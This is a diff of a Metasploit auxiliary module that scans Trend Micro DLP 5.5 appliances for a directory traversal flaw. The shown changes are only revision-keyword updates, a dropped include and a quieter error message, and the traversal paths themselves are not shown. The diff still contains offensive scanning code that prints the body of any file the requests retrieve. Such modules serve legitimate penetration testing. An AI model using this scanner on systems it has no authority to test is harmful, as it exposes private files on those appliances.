@@ -1,5 +1,5 @@
 ##
-# $Id$
+# $Id: trendmicro_dlp_traversal.rb 14288 2011-11-20 02:15:04Z rapid7 $
 ##
 
 ##
@@ -14,13 +14,12 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::HttpClient
-	include Msf::Auxiliary::WMAPScanServer
 	include Msf::Auxiliary::Scanner
 
 	def initialize
 		super(
 			'Name'        => 'TrendMicro Data Loss Prevention 5.5 Directory Traversal',
-			'Version'     => '$Revision$',
+			'Version'     => '$Revision: 14288 $',
 			'Description' => %q{
 				This module tests whether a directory traversal vulnerablity is present
 				in Trend Micro DLP (Data Loss Prevention) Appliance v5.5 build <= 1294.
@@ -78,7 +77,7 @@ class Metasploit3 < Msf::Auxiliary
 			print_status("Request may have succeeded on #{rhost}:#{rport}:file->#{files}! Response: \r\n#{res.body}")
 			@files_found << files
 		elsif (res and res.code)
-			print_error("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport}:file->#{files}")
+			vprint_status("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport}:file->#{files}")
 		end
 	end
 
